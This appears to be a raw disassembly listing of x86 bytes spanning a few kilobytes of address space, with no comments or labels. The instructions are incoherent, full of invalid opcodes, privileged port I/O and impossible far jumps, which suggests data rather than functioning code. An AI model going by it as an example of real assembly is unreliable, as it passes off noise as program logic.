  41b82a:	outs   dx,BYTE PTR ds:[esi]
  41b82b:	inc    ebx
  41b82c:	aaa    
  41b82d:	stc    
  41b82e:	mov    eax,ds:0xa80c6afd
  41b833:	mov    ecx,DWORD PTR [edx-0x40b5156d]
  41b839:	push   cs
  41b83a:	mov    ah,0x40
  41b83c:	pop    edx
  41b83d:	pop    edx
  41b83e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b83f:	fdivr  st(0),st
	...
  41b8b1:	add    BYTE PTR [eax],al
  41b8b3:	add    BYTE PTR ds:0xcf4a867e,dh
  41b8b9:	cli    
  41b8ba:	std    
  41b8bb:	jg     0x41b85c
  41b8bd:	into   
  41b8be:	jno    0x41b916
  41b8c0:	xchg   DWORD PTR [ebp+0x297fc949],eax
  41b8c6:	add    DWORD PTR [eax],eax
  41b8c8:	cmc    
  41b8c9:	add    BYTE PTR [eax],al
  41b8cb:	add    BYTE PTR [esi-0x1f],bh
  41b8ce:	not    DWORD PTR [eax-0xc152385]
  41b8d4:	inc    ebx
  41b8d5:	fs cmp al,0x2b
  41b8d8:	xchg   edx,eax
  41b8d9:	shl    bh,0x67
  41b8dc:	mov    BYTE PTR [edx+0x67],dl
  41b8df:	jge    0x41b8d6
  41b8e1:	jecxz  0x41b948
  41b8e3:	push   esp
  41b8e4:	mov    esi,0xc04fdc14
  41b8e9:	mov    dh,0x0
  41b8eb:	sti    
  41b8ec:	xchg   edx,eax
  41b8ed:	inc    edx
  41b8ee:	js     0x41b87e
  41b8f0:	jne    0x41b8b0
  41b8f2:	dec    ecx
  41b8f3:	inc    ebx
  41b8f4:	imul   ebx,DWORD PTR [esp+edi*1+0x22e6e9e0],0x93263e34
  41b8ff:	fild   DWORD PTR [ebx-0x36ccb27f]
  41b905:	and    al,0x2f
  41b907:	loop   0x41b93e
  41b909:	mov    eax,ds:0xb81d54a
  41b90e:	hlt    
  41b90f:	push   eax
  41b910:	fistp  DWORD PTR [edi-0x30]
  41b913:	adc    BYTE PTR [edx+0x5],bl
  41b916:	pop    eax
  41b917:	mov    ds:0xf79a9da1,eax
  41b91c:	mov    bh,0xd2
  41b91e:	mov    ebx,0x2c1f5c3f
  41b923:	adc    BYTE PTR [ecx+0xcd088c7],ah
  41b929:	push   0xfffffffa
  41b92b:	mov    esi,0x1b7d814a
  41b930:	add    BYTE PTR [esi],ch
  41b932:	retf   
  41b933:	nop
  41b934:	addr16 popa 
  41b936:	mov    bh,0x49
  41b938:	sbb    al,0xb9
  41b93a:	not    DWORD PTR ds:0x18958fd8
  41b940:	fwait
  41b941:	enter  0xb053,0x9d
  41b945:	hlt    
  41b946:	push   edx
  41b947:	inc    edi
  41b948:	sub    BYTE PTR [esi-0x1fea0982],0x7f
  41b94f:	push   ds
  41b950:	scas   eax,DWORD PTR es:[edi]
  41b951:	sub    eax,0xfe73d4fb
  41b956:	add    ecx,DWORD PTR [ebp-0x3b772103]
  41b95c:	jbe    0x41b927
  41b95e:	fcom   DWORD PTR [ebx-0x229d4bc7]
  41b964:	xchg   BYTE PTR [ebp+0x7a],dl
  41b967:	ret    
  41b968:	sub    al,0x1a
  41b96a:	pusha  
  41b96b:	xchg   ebp,eax
  41b96c:	jo     0x41b982
  41b96e:	xor    edi,edx
  41b970:	xor    edi,ebx
  41b972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b973:	cmp    eax,0xfe4f130e
  41b978:	movaps xmm6,XMMWORD PTR [ecx+0x9f88493]
  41b97f:	lea    ebx,[esi]
  41b981:	inc    eax
  41b982:	(bad)  
  41b983:	xchg   ebx,eax
  41b984:	hlt    
  41b985:	xchg   ecx,eax
  41b986:	lea    ebx,[edx-0x1810baa0]
  41b98c:	and    eax,0x8c732909
  41b991:	dec    edi
  41b992:	imul   ebx,DWORD PTR [esi+0x82f4a64],0x11
  41b999:	mov    bl,0x99
  41b99b:	jp     0x41b9fd
  41b99d:	inc    ecx
  41b99e:	inc    DWORD PTR [eax-0x2e516351]
  41b9a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9a5:	in     eax,dx
  41b9a6:	call   0x2b225c88
  41b9ab:	cmp    bl,dh
  41b9ad:	call   0xe9e3:0xd1b7c044
  41b9b4:	popf   
  41b9b5:	add    BYTE PTR [ebp-0x6d6c4b93],bh
  41b9bb:	inc    ebx
  41b9bc:	cdq    
  41b9bd:	aas    
  41b9be:	xchg   edx,eax
  41b9bf:	xchg   ecx,eax
  41b9c0:	cwde   
	...
  41ba31:	add    BYTE PTR [eax],al
  41ba33:	add    bh,dh
  41ba35:	add    esp,ebx
  41ba37:	mov    ah,0xfe
  41ba39:	std    
  41ba3a:	inc    DWORD PTR [ebx-0x11]
  41ba3d:	sub    ecx,DWORD PTR [edx]
  41ba3f:	pop    edi
  41ba40:	and    BYTE PTR [ebx],dl
  41ba42:	sub    ah,dl
  41ba44:	je     0x41ba70
  41ba46:	add    DWORD PTR [eax],eax
  41ba48:	cmc    
  41ba49:	add    BYTE PTR [eax],al
  41ba4b:	add    cl,ch
  41ba4d:	(bad)  
  41ba4e:	out    0xa7,eax
  41ba50:	ror    ebx,cl
  41ba52:	sbb    cl,BYTE PTR [esi+ebp*4+0x3b212656]
  41ba59:	(bad)  
  41ba5b:	mov    es,edx
  41ba5d:	test   al,0x79
  41ba5f:	xor    eax,0x585a9342
  41ba64:	inc    ebx
  41ba65:	xor    edi,DWORD PTR [edi]
  41ba67:	and    esp,DWORD PTR [eax+ebp*8]
  41ba6a:	xor    BYTE PTR [ebp+0x5c5e2dac],0xf6
  41ba71:	adc    al,0x3f
  41ba73:	lea    edi,[esi]
  41ba75:	mov    bl,0x93
  41ba77:	dec    eax
  41ba78:	mov    dh,0xb6
  41ba7a:	shl    BYTE PTR [edi+0x724efdf9],1
  41ba80:	daa    
  41ba81:	mov    bh,0xca
  41ba83:	test   eax,0x5aee08f
  41ba88:	cdq    
  41ba89:	mov    bl,0xeb
  41ba8b:	std    
  41ba8c:	dec    eax
  41ba8d:	and    bh,BYTE PTR [ebp-0x2a4eb4ae]
  41ba93:	out    0xbc,al
  41ba95:	iret   
  41ba96:	ret    
  41ba97:	(bad)  
  41ba99:	ins    BYTE PTR es:[edi],dx
  41ba9a:	clc    
  41ba9b:	ja     0x41ba95
  41ba9d:	out    0x13,eax
  41ba9f:	xor    DWORD PTR [ebx-0x5fc17cb6],edx
  41baa5:	test   esi,ebp
  41baa7:	xchg   ebp,eax
  41baa8:	pop    edi
  41baa9:	jecxz  0x41ba2c
  41baab:	jmp    0x41ba61
  41baad:	mov    ebx,0x47e599bb
  41bab2:	call   0x350f:0x24476b32
  41bab9:	jmp    0x7bb8045d
  41babe:	cmp    al,0x54
  41bac0:	lahf   
  41bac1:	push   cx
  41bac3:	push   ebp
  41bac4:	push   edx
  41bac5:	push   ss
  41bac6:	(bad)  
  41bac8:	stos   BYTE PTR es:[edi],al
  41bac9:	rol    DWORD PTR [edx+0x50],1
  41bacc:	ins    BYTE PTR es:[edi],dx
  41bacd:	push   ebp
  41bace:	clc    
  41bacf:	inc    esp
  41bad0:	xor    BYTE PTR [edx+0x318af395],bh
  41bad6:	push   0x4e
  41bad8:	mov    ds:0x1412421b,al
  41badd:	push   ss
  41bade:	jne    0x41baf1
  41bae0:	cmp    eax,0x60898ac4
  41bae5:	cmp    dh,0xd7
  41bae8:	adc    esp,DWORD PTR [ebp-0x1e5b11e9]
  41baee:	pop    ss
  41baef:	jnp    0x41ba77
  41baf1:	mov    ebx,0xc6cd7c74
  41baf6:	bound  esi,QWORD PTR [eax]
  41baf8:	sar    BYTE PTR [ecx],0x56
  41bafb:	stos   BYTE PTR es:[edi],al
  41bafc:	adc    esi,DWORD PTR [edi]
  41bafe:	ds ret 0x525f
  41bb02:	aaa    
  41bb03:	pop    es
  41bb04:	xlat   BYTE PTR ds:[ebx]
  41bb05:	adc    BYTE PTR [esi-0x48],bl
  41bb08:	fisub  WORD PTR [esi+0x13]
  41bb0b:	adc    dl,BYTE PTR [ebp-0x21]
  41bb0e:	sub    al,0xee
  41bb10:	xchg   bh,bl
  41bb12:	pop    DWORD PTR [esp+ebx*4+0x50861322]
  41bb19:	adc    eax,0xd7285e3c
  41bb1e:	cmp    DWORD PTR [esi],ecx
  41bb20:	test   BYTE PTR [edi],cl
  41bb22:	lahf   
  41bb23:	pop    esi
  41bb24:	xchg   edx,eax
  41bb25:	dec    edi
  41bb26:	pop    esi
  41bb27:	ret    
  41bb28:	fwait
  41bb29:	sar    dl,1
  41bb2b:	mov    DWORD PTR [ecx],eax
  41bb2d:	dec    esp
  41bb2e:	aam    0xd9
  41bb30:	jnp    0x41bac9
  41bb32:	mov    eax,0x21f209e
  41bb37:	inc    esi
  41bb38:	pop    esp
  41bb39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb3a:	mov    al,BYTE PTR [edx+0x25]
  41bb3d:	push   ss
  41bb3e:	jns    0x41bb09
  41bb40:	rol    BYTE PTR [eax],0x0
	...
  41bbb3:	add    BYTE PTR [edx+0x49],ch
  41bbb6:	es cmp al,0x27
  41bbb9:	jg     0x41bc35
  41bbbb:	pop    edi
  41bbbc:	xor    DWORD PTR [edx+edi*2],0x3a
  41bbc0:	push   DWORD PTR [edx+0x52]
  41bbc3:	jnp    0x41bc2e
  41bbc5:	sub    eax,DWORD PTR [ecx]
  41bbc7:	add    ch,dh
  41bbc9:	add    BYTE PTR [eax],al
  41bbcb:	add    bl,bh
  41bbcd:	in     eax,0xc3
  41bbcf:	lahf   
  41bbd0:	xchg   edx,eax
  41bbd1:	mov    cl,0x5a
  41bbd3:	mov    bh,0x5f
  41bbd5:	jg     0x41bb71
  41bbd7:	popf   
  41bbd8:	outs   dx,BYTE PTR ds:[esi]
  41bbd9:	jo     0x41bbee
  41bbdb:	push   ecx
  41bbdc:	mov    bh,0xa
  41bbde:	xchg   ecx,eax
  41bbdf:	xchg   ch,bh
  41bbe1:	aas    
  41bbe2:	mov    cl,0x88
  41bbe4:	in     al,0x88
  41bbe6:	setb   BYTE PTR [ebp-0x64c7ba97]
  41bbed:	pushf  
  41bbee:	sub    esi,0x97026679
  41bbf4:	or     dh,BYTE PTR [ebx+0x5383d0fa]
  41bbfa:	btr    DWORD PTR [ebx-0x37],ebp
  41bbfe:	gs into 
  41bc00:	mov    esp,0xe0543558
  41bc05:	mov    cl,0xa2
  41bc07:	mov    ah,0x72
  41bc09:	mov    esi,0xac86979
  41bc0e:	mov    dl,0x63
  41bc10:	and    al,BYTE PTR [ebx-0x3b]
  41bc13:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc14:	push   eax
  41bc15:	push   ebp
  41bc16:	popf   
  41bc17:	ja     0x41bc21
  41bc19:	and    eax,0x605a1186
  41bc1e:	cmp    al,0x67
  41bc20:	stc    
  41bc21:	inc    ecx
  41bc22:	xchg   ecx,eax
  41bc23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc24:	stos   BYTE PTR es:[edi],al
  41bc25:	nop
  41bc26:	dec    ecx
  41bc27:	mov    cl,0xd2
  41bc29:	adc    al,0xb5
  41bc2b:	jge    0x41bc74
  41bc2d:	loope  0x41bbe9
  41bc2f:	push   edi
  41bc30:	mov    esi,0x1b3d063
  41bc35:	jb     0x41bc7a
  41bc37:	neg    BYTE PTR [edx-0x38]
  41bc3a:	xchg   edx,eax
  41bc3b:	jmp    0xca6b9568
  41bc40:	jb     0x41bc46
  41bc42:	fadd   DWORD PTR [esi-0x72]
  41bc45:	loopne 0x41bcb9
  41bc47:	inc    edx
  41bc48:	test   eax,0x9efe8bed
  41bc4d:	fist   DWORD PTR [ecx-0x72]
  41bc50:	enter  0x7c77,0x5e
  41bc54:	and    DWORD PTR [edx],0xffffffc2
  41bc57:	lea    ecx,[edi-0x5e]
  41bc5a:	xchg   ebx,eax
  41bc5b:	sbb    ecx,DWORD PTR [esi+ebp*4]
  41bc5e:	dec    esi
  41bc5f:	stos   DWORD PTR es:[edi],eax
  41bc60:	mov    dl,0x92
  41bc62:	arpl   WORD PTR [ebp+0x67],bx
  41bc65:	retf   
  41bc66:	lods   al,BYTE PTR ds:[esi]
  41bc67:	add    eax,DWORD PTR ds:0x21053628
  41bc6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc6e:	test   edi,ebp
  41bc70:	retf   
  41bc71:	xchg   edi,eax
  41bc72:	cmp    cl,BYTE PTR [eax+0x33]
  41bc75:	push   esp
  41bc76:	sub    edx,ebx
  41bc78:	mov    edi,0xf9563d92
  41bc7d:	fild   QWORD PTR ds:0xb0429413
  41bc83:	pop    ds
  41bc84:	pop    eax
  41bc85:	jns    0x41bcb4
  41bc87:	call   0xebde4a9c
  41bc8c:	(bad)
  41bc90:	loop   0x41bc2d
  41bc92:	mov    cl,0xa7
  41bc94:	out    dx,eax
  41bc95:	push   esi
  41bc96:	push   ss
  41bc97:	inc    eax
  41bc98:	pop    ss
  41bc99:	fdivr  QWORD PTR [edx-0x7a]
  41bc9c:	fidiv  DWORD PTR [ebp+0x45]
  41bc9f:	or     al,0x27
  41bca1:	cmc    
  41bca2:	add    al,0x4d
  41bca4:	shr    eax,cl
  41bca6:	pop    eax
  41bca7:	mov    WORD PTR [esi-0x7f],es
  41bcaa:	mov    ecx,0xaf8c60a
  41bcaf:	icebp  
  41bcb0:	inc    ebx
  41bcb1:	cld    
  41bcb2:	ss pop ebp
  41bcb4:	in     al,dx
  41bcb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcb6:	jo     0x41bd03
  41bcb8:	enter  0x141e,0x36
  41bcbc:	(bad)  
  41bcbd:	imul   ebx,DWORD PTR [edi-0x11],0x67
	...
  41bd31:	add    BYTE PTR [eax],al
  41bd33:	add    BYTE PTR [ebp-0x8],dl
  41bd36:	or     DWORD PTR [esi-0x4280053],ebx
  41bd3c:	cmp    eax,0x7fbf1c9a
  41bd41:	xlat   BYTE PTR ds:[ebx]
  41bd42:	les    esp,FWORD PTR [esi+0x5e]
  41bd45:	sub    al,0x1
  41bd47:	add    ch,dh
  41bd49:	add    BYTE PTR [eax],al
  41bd4b:	add    BYTE PTR [esi],al
  41bd4d:	ret    
  41bd4e:	mov    ecx,DWORD PTR [esi]
  41bd50:	push   0xf2b67d9b
  41bd55:	jecxz  0x41bd3a
  41bd57:	inc    ebp
  41bd58:	xchg   esp,eax
  41bd59:	sub    BYTE PTR [eax+edi*1],0xfc
  41bd5d:	and    ah,BYTE PTR [ebp-0x43]
  41bd60:	push   0xb66831c3
  41bd65:	aad    0x72
  41bd67:	(bad)  
  41bd68:	or     eax,0x67460fe2
  41bd6d:	es sub al,0x2b
  41bd70:	or     esp,ebp
  41bd72:	fisttp WORD PTR [edx]
  41bd74:	shl    bl,0xa3
  41bd77:	in     al,0xc6
  41bd79:	push   es
  41bd7a:	aas    
  41bd7b:	ret    
  41bd7c:	push   ds
  41bd7d:	call   0x43a1:0xff45b0c1
  41bd84:	ins    DWORD PTR es:[edi],dx
  41bd85:	mov    esp,0x6ebb682f
  41bd8a:	jmp    0x41bd86
  41bd8c:	shl    BYTE PTR [edi-0x7eaab9fe],cl
  41bd92:	test   DWORD PTR [esi+esi*4],esi
  41bd95:	jecxz  0x41bd5a
  41bd97:	cmp    BYTE PTR [ecx+ebx*2-0x5df53d13],0xeb
  41bd9f:	pop    edi
  41bda0:	retf   
  41bda1:	mov    ebp,0xad1cfed3
  41bda6:	test   eax,0x6c570310
  41bdab:	jmp    0x2d4b5ca7
  41bdb0:	mov    bl,0x74
  41bdb2:	cld    
  41bdb3:	pop    esi
  41bdb4:	mov    bh,0xe5
  41bdb6:	int3   
  41bdb7:	mov    bh,0x89
  41bdb9:	push   0xec6684ab
  41bdbe:	mov    dh,0xe
  41bdc0:	inc    esp
  41bdc1:	inc    ebx
  41bdc2:	out    dx,al
  41bdc3:	fsub   DWORD PTR [ebp+0x5ee188d9]
  41bdc9:	sub    ecx,edx
  41bdcb:	jp     0x41bd74
  41bdcd:	outs   dx,DWORD PTR ds:[esi]
  41bdce:	mov    ecx,DWORD PTR [esi]
  41bdd0:	cmc    
  41bdd1:	dec    ebx
  41bdd2:	xchg   ebp,eax
  41bdd3:	or     ebx,DWORD PTR [esi+0x1b09530b]
  41bdd9:	pop    esp
  41bdda:	cwde   
  41bddb:	in     eax,dx
  41bddc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bddd:	inc    eax
  41bdde:	nop
  41bddf:	lods   eax,DWORD PTR ds:[esi]
  41bde0:	xor    al,0x6d
  41bde2:	scas   eax,DWORD PTR es:[edi]
  41bde3:	dec    esi
  41bde4:	enter  0xf4cd,0xec
  41bde8:	and    dh,al
  41bdea:	and    ah,dl
  41bdec:	mov    eax,ds:0xddbe82b1
  41bdf1:	loope  0x41bde0
  41bdf3:	xchg   ebx,eax
  41bdf4:	fwait
  41bdf5:	push   edx
  41bdf6:	in     eax,0x6d
  41bdf8:	loopne 0x41bd98
  41bdfa:	mov    bh,BYTE PTR [ebp+ecx*8-0x17239abc]
  41be01:	pop    esi
  41be02:	cmp    BYTE PTR [edx-0x12],0xfa
  41be06:	sbb    dh,BYTE PTR [ebp-0x81f00e8]
  41be0c:	ins    DWORD PTR es:[edi],dx
  41be0d:	sbb    esp,DWORD PTR [eax+0x333b643]
  41be13:	adc    ecx,ecx
  41be15:	sub    BYTE PTR [ebp-0x23],dl
  41be18:	or     BYTE PTR [ebx],ah
  41be1a:	mov    eax,0x4c4443eb
  41be1f:	shl    DWORD PTR [edi],cl
  41be21:	into   
  41be22:	sub    BYTE PTR [eax],ch
  41be24:	jge    0x41be09
  41be26:	pop    DWORD PTR [ebx+edi*2]
  41be29:	adc    cl,0xb6
  41be2c:	test   eax,0x5944f152
  41be31:	mov    ebp,0x85aff794
  41be36:	cmp    bh,ah
  41be38:	or     ebx,DWORD PTR [ebx]
  41be3a:	(bad)  
  41be3b:	sub    cl,BYTE PTR [edi+0x16584fdb]
	...
  41beb1:	add    BYTE PTR [eax],al
  41beb3:	add    ch,al
  41beb5:	stc    
  41beb6:	lods   eax,DWORD PTR ds:[esi]
  41beb7:	xor    edi,DWORD PTR [ebp-0x57002089]
  41bebd:	ja     0x41bf3b
  41bebf:	(bad)  
  41bec1:	retf   0xf4cb
  41bec4:	push   ebx
  41bec5:	sub    eax,0xf50001
  41beca:	add    BYTE PTR [eax],al
  41becc:	push   esi
  41becd:	rcl    DWORD PTR [ebp-0x1495e758],cl
  41bed3:	jbe    0x41bf2c
  41bed5:	add    DWORD PTR [esi-0x1a4f8c05],eax
  41bedb:	sub    eax,0x4280d7fd
  41bee0:	pop    ebx
  41bee1:	imul   esi,ecx,0xc55b93a8
  41bee7:	mov    al,BYTE PTR [esi+0x2b]
  41beea:	xor    dh,BYTE PTR [esi+0x46]
  41beed:	add    al,0xfa
  41beef:	push   ecx
  41bef0:	inc    ebp
  41bef1:	in     al,0x2b
  41bef3:	adc    BYTE PTR [esi+ebp*8],dh
  41bef6:	xchg   ebx,eax
  41bef7:	call   0x73ed31e4
  41befc:	or     eax,0xfae2fb1d
  41bf01:	mov    al,0x5e
  41bf03:	or     al,0x27
  41bf05:	pop    edi
  41bf06:	sub    esi,DWORD PTR [edi+0x7e6518c9]
  41bf0c:	sbb    DWORD PTR [ebp-0x37021005],edx
  41bf12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf13:	ja     0x41be98
  41bf15:	xchg   DWORD PTR [ebp-0x5e57b0b7],esi
  41bf1b:	(bad)  
  41bf1c:	js     0x41bf89
  41bf1e:	loopne 0x41bf31
  41bf20:	cmc    
  41bf21:	adc    ebp,DWORD PTR [edi-0x49c53584]
  41bf27:	or     BYTE PTR [esi],dh
  41bf29:	outs   dx,DWORD PTR ds:[esi]
  41bf2a:	jl     0x41bee9
  41bf2c:	xchg   esp,eax
  41bf2d:	enter  0x491f,0x74
  41bf31:	mov    cl,0x75
  41bf33:	inc    eax
  41bf34:	xchg   BYTE PTR [edx-0x3c],cl
  41bf37:	pop    edx
  41bf38:	rol    BYTE PTR [esi-0x6d6f4ca7],cl
  41bf3e:	cmc    
  41bf3f:	lds    esp,FWORD PTR [eax]
  41bf41:	jmp    0x41bf58
  41bf43:	(bad)  
  41bf45:	mov    ch,0xbc
  41bf47:	dec    ecx
  41bf48:	mov    al,0xe7
  41bf4a:	stc    
  41bf4b:	in     al,0xc2
  41bf4d:	mov    dh,0x94
  41bf4f:	loop   0x41bf75
  41bf51:	cld    
  41bf52:	fstp   DWORD PTR [ebx-0x44]
  41bf55:	or     eax,0x7cbae078
  41bf5a:	push   ds
  41bf5b:	bound  esp,QWORD PTR [esi]
  41bf5d:	xchg   BYTE PTR [ecx],bl
  41bf5f:	mov    al,bh
  41bf61:	jmp    0xb92c:0x1ab9620b
  41bf68:	pushf  
  41bf69:	jge    0x41bf02
  41bf6b:	imul   ecx,DWORD PTR [ebp+0x3a52de3e],0xffffffd8
  41bf72:	xchg   BYTE PTR [edx+0x37def78c],ch
  41bf78:	sbb    eax,0xc597ab0c
  41bf7d:	pop    esi
  41bf7e:	fs push cs
  41bf80:	adc    ecx,edi
  41bf82:	jmp    0x2c911336
  41bf87:	adc    dl,BYTE PTR cs:[edi+edx*8+0x29]
  41bf8c:	popf   
  41bf8d:	xchg   edi,ebx
  41bf8f:	inc    ebp
  41bf90:	and    eax,0xba9509d1
  41bf95:	shl    DWORD PTR [esp+ecx*4-0x28],1
  41bf99:	pop    ebx
  41bf9a:	push   ds
  41bf9b:	aam    0xcb
  41bf9d:	scas   eax,DWORD PTR es:[edi]
  41bf9e:	stc    
  41bf9f:	jb     0x41bf69
  41bfa1:	xor    ebx,DWORD PTR [edx+0x15]
  41bfa4:	sbb    eax,0x38e12e1d
  41bfa9:	cmp    al,0x7a
  41bfab:	sbb    BYTE PTR [edx-0x1eb75364],ch
  41bfb1:	xor    al,0x1e
  41bfb3:	or     ecx,DWORD PTR [ebx+eiz*4]
  41bfb6:	dec    eax
  41bfb7:	mov    al,ds:0xcfac7a5f
  41bfbc:	sub    BYTE PTR [edi+0x6e50e4],0x0
	...
  41c033:	add    dh,al
  41c035:	ficom  WORD PTR [eax]
  41c037:	stos   DWORD PTR es:[edi],eax
  41c038:	sbb    bh,ch
  41c03a:	(bad)  
  41c03b:	jmp    FWORD PTR [esi+0x23bb9a81]
  41c041:	scas   eax,DWORD PTR es:[edi]
  41c042:	in     al,dx
  41c043:	xchg   edx,eax
  41c044:	dec    eax
  41c045:	add    DWORD PTR cs:[eax],eax
  41c048:	cmc    
  41c049:	add    BYTE PTR [eax],al
  41c04b:	add    al,dl
  41c04d:	outs   dx,DWORD PTR ds:[esi]
  41c04e:	repz pop ds
  41c050:	mov    ah,0x84
  41c052:	add    esp,DWORD PTR [eax+0x5d4ff962]
  41c058:	push   0xf
  41c05a:	sbb    al,0x48
  41c05c:	xchg   esp,eax
  41c05d:	add    al,0xab
  41c05f:	sbb    dh,bh
  41c061:	outs   dx,BYTE PTR ds:[esi]
  41c062:	jo     0x41c09e
  41c064:	lods   eax,DWORD PTR ds:[esi]
  41c065:	fnstenv [edx+0x33]
  41c068:	(bad)  
  41c069:	and    DWORD PTR [eax+0x2feb3e2c],esp
  41c06f:	jne    0x41c032
  41c071:	push   ss
  41c072:	fsub   st,st(1)
  41c074:	int3   
  41c075:	and    edi,DWORD PTR [eax-0x96c6fe2]
  41c07b:	mov    ebp,DWORD PTR [ebx+0x1f]
  41c07e:	add    eax,DWORD PTR [esi+0x4d]
  41c081:	sar    BYTE PTR ds:0x35238ad7,cl
  41c087:	repz add eax,0xd7ea290e
  41c08d:	scas   al,BYTE PTR es:[edi]
  41c08e:	adc    DWORD PTR [edi],ecx
  41c090:	xor    ah,BYTE PTR [eax+0x8]
  41c093:	in     al,0xd0
  41c095:	pop    ss
  41c096:	stc    
  41c097:	sbb    edx,edx
  41c099:	pop    esp
  41c09a:	adc    al,0xd8
  41c09c:	ds mov cl,0xf6
  41c09f:	cmp    al,BYTE PTR [edi+0x5a]
  41c0a2:	jbe    0x41c0ba
  41c0a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0a5:	fldcw  WORD PTR [eax]
  41c0a7:	std    
  41c0a8:	into   
  41c0a9:	cmp    eax,0x26a4a76b
  41c0ae:	xor    ebp,DWORD PTR [edx+0x2c]
  41c0b1:	lods   al,BYTE PTR ds:[esi]
  41c0b2:	pop    ebp
  41c0b3:	test   ecx,ebx
  41c0b5:	add    al,0xd1
  41c0b7:	fcomi  st,st(1)
  41c0b9:	push   ebp
  41c0ba:	mov    edx,0xf63c1fbd
  41c0bf:	push   0x2f
  41c0c1:	stos   BYTE PTR es:[edi],al
  41c0c2:	inc    eax
  41c0c3:	xchg   ebp,eax
  41c0c4:	ficomp WORD PTR [edx+0x5cc60dba]
  41c0ca:	add    dl,BYTE PTR [edx-0x78]
  41c0cd:	ret    
  41c0ce:	pop    eax
  41c0cf:	mov    ds:0xa32f56cb,eax
  41c0d4:	xor    esp,ecx
  41c0d6:	repz in eax,0x53
  41c0d9:	popf   
  41c0da:	test   eax,0x2a7b020c
  41c0e0:	fwait
  41c0e1:	pop    ecx
  41c0e2:	push   ebp
  41c0e3:	inc    ebx
  41c0e4:	add    eax,eax
  41c0e6:	fild   QWORD PTR [eax+0x6b]
  41c0e9:	test   al,0x2f
  41c0eb:	jnp    0x41c0ad
  41c0ed:	ja     0x41c081
  41c0ef:	fdivr  DWORD PTR [edi+0x5bb62da4]
  41c0f5:	aad    0xbb
  41c0f7:	rcr    ch,1
  41c0f9:	push   0x41e4582d
  41c0fe:	sbb    dh,BYTE PTR [esi]
  41c100:	mov    cl,BYTE PTR [ecx+esi*1]
  41c103:	sbb    al,0x4e
  41c105:	ins    BYTE PTR es:[edi],dx
  41c106:	jecxz  0x41c0a6
  41c108:	retf   0xe6f2
  41c10b:	ret    
  41c10c:	pop    DWORD PTR [esi-0x4f136b6d]
  41c112:	(bad)  
  41c113:	jl     0x41c105
  41c115:	push   edx
  41c116:	test   al,0x84
  41c118:	fsubr  DWORD PTR [edi-0x2ed2ebd3]
  41c11e:	ja     0x41c0f9
  41c120:	sbb    al,0x3f
  41c122:	ins    DWORD PTR es:[edi],dx
  41c123:	adc    DWORD PTR ds:0xc212a087,0x3228ab81
  41c12d:	or     DWORD PTR es:[esi-0x36],edx
  41c131:	cld    
  41c132:	scas   eax,DWORD PTR es:[edi]
  41c133:	sbb    BYTE PTR [edi+0x64da6888],cl
  41c139:	xor    DWORD PTR [edi+0x541be766],0xb896
	...
  41c1b3:	add    BYTE PTR [esi+0x6be069a5],cl
  41c1b9:	in     al,dx
  41c1ba:	(bad)  
  41c1bb:	out    dx,eax
  41c1bc:	sbb    BYTE PTR [edi],0x8e
  41c1bf:	sbb    eax,0x25cf0567
  41c1c4:	cmp    eax,0xf500012f
  41c1c9:	add    BYTE PTR [eax],al
  41c1cb:	add    cl,al
  41c1cd:	or     DWORD PTR [edi+edi*4-0x355ca74a],ebp
  41c1d4:	dec    edi
  41c1d5:	(bad)  
  41c1d6:	push   DWORD PTR [esi-0x1e]
  41c1d9:	mov    esp,0x3d3385fa
  41c1de:	je     0x41c16e
  41c1e0:	mov    esi,0x2aac837e
  41c1e5:	inc    esp
  41c1e6:	outs   dx,DWORD PTR ds:[esi]
  41c1e7:	sbb    edx,DWORD PTR [eax-0x6fcdf98]
  41c1ed:	jg     0x41c234
  41c1ef:	mov    cl,0x2c
  41c1f1:	rol    edx,1
  41c1f3:	sub    DWORD PTR [ecx],ecx
  41c1f5:	inc    esp
  41c1f6:	aas    
  41c1f7:	mov    dl,0x88
  41c1f9:	cwde   
  41c1fa:	inc    ecx
  41c1fb:	mov    ds:0x52f6a3fe,eax
  41c200:	fwait
  41c201:	xor    al,0xe
  41c203:	scas   al,BYTE PTR es:[edi]
  41c204:	mov    cl,dl
  41c206:	mov    bh,0xe1
  41c208:	mov    ecx,0xefcb1c6c
  41c20d:	and    al,0xcb
  41c20f:	or     eax,0x662d070b
  41c214:	push   0x51
  41c216:	je     0x41c198
  41c218:	cmp    BYTE PTR [ecx-0x5bc6d820],dl
  41c21e:	and    ch,dh
  41c220:	pop    ss
  41c221:	sbb    ebp,DWORD PTR [esp+edx*1]
  41c224:	mov    fs,edi
  41c226:	in     eax,dx
  41c227:	out    0xb0,eax
  41c229:	loopne 0x41c1b9
  41c22b:	leave  
  41c22c:	or     eax,0xd8218b17
  41c231:	xor    eax,esi
  41c233:	out    dx,eax
  41c234:	fcmovu st,st(6)
  41c236:	in     al,0xf4
  41c238:	push   esi
  41c239:	shl    bh,0xf0
  41c23c:	cdq    
  41c23d:	fsubr  DWORD PTR [edi-0x538c801d]
  41c243:	inc    edx
  41c244:	outs   dx,BYTE PTR ds:[esi]
  41c245:	outs   dx,BYTE PTR ds:[esi]
  41c246:	test   DWORD PTR [ebp-0x5e1fece4],ecx
  41c24c:	inc    edx
  41c24d:	(bad)
  41c251:	stos   BYTE PTR es:[edi],al
  41c252:	mov    esp,0xcdb29948
  41c257:	adc    eax,0xb6e3a95
  41c25c:	mov    dh,bl
  41c25e:	mov    bl,0x99
  41c260:	dec    ecx
  41c261:	sar    BYTE PTR [ebp-0x47],1
  41c264:	int    0xa2
  41c266:	test   al,0xb0
  41c268:	cs (bad) 
  41c26a:	mov    esp,0x28719d17
  41c26f:	shr    al,cl
  41c271:	aaa    
  41c272:	fsubp  st(5),st
  41c274:	pushf  
  41c275:	div    DWORD PTR [esi-0x7f]
  41c278:	pop    es
  41c279:	fs pop ecx
  41c27b:	push   ss
  41c27c:	sub    DWORD PTR [eax],0x7f
  41c27f:	popf   
